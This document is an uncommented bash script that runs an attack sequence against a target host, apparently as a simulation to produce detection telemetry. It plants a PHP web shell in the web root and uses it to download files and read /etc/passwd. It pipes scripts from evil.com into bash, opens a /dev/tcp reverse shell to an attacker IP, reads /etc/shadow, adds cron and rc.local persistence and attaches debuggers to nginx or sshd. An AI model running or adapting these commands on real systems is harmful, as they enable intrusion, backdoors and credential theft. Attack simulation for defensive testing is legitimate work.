#!/bin/bash
set -e
TARGET_IP=${1:-127.0.0.1}
ATTACKER_IP=${2:-127.0.0.1}
PORT=${3:-4444}
grep -q "\bevil.com\b" /etc/hosts || echo "$ATTACKER_IP evil.com" >> /etc/hosts
curl -s http://$TARGET_IP/ >/dev/null 2>&1 || true
sleep 2
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.txt
sleep 1
mv /tmp/shell.txt /var/www/html/backdoor.php >/dev/null 2>&1 || true
sleep 2
curl -s "http://$TARGET_IP/backdoor.php?c=curl http://evil.com/mal -o /tmp/mal" >/dev/null 2>&1 || true
sleep 2
curl -s "http://$TARGET_IP/backdoor.php?c=cat /etc/passwd" >/dev/null 2>&1 || true
sleep 2
curl -s http://evil.com/s.sh | bash >/dev/null 2>&1 || true
sleep 2
wget -qO- http://evil.com/s.sh | bash >/dev/null 2>&1 || true
sleep 2
bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1" >/dev/null 2>&1 &
sleep 3
pkill -f "/dev/tcp/$ATTACKER_IP/$PORT" >/dev/null 2>&1 || true
sleep 2
sudo -u www-data bash -c 'curl -s http://evil.com/m.sh -o /tmp/m.sh' >/dev/null 2>&1 || true
sleep 2
cat /etc/shadow >/dev/null 2>&1 || true
sleep 2
echo '* * * * * root /bin/touch /tmp/persist' >> /etc/cron.d/root_job 2>/dev/null || true
sleep 2
echo 'touch /tmp/rc_persist' >> /etc/rc.local 2>/dev/null || true
sleep 2
echo 'data' > /dev/shm/.hidden
sleep 1
mv /dev/shm/.hidden /var/www/html/.hidden >/dev/null 2>&1 || true
sleep 2
echo '<?php echo "ok"; ?>' > /var/www/html/pass.php 2>/dev/null || true
sleep 2
PID="$(pidof nginx || pidof sshd || true)"
if [ -n "$PID" ]; then
  timeout 2s gdb -p "$PID" -ex quit >/dev/null 2>&1 || true
  sleep 2
  timeout 2s strace -p "$PID" -o /tmp/trace.$$ >/dev/null 2>&1 || true
fi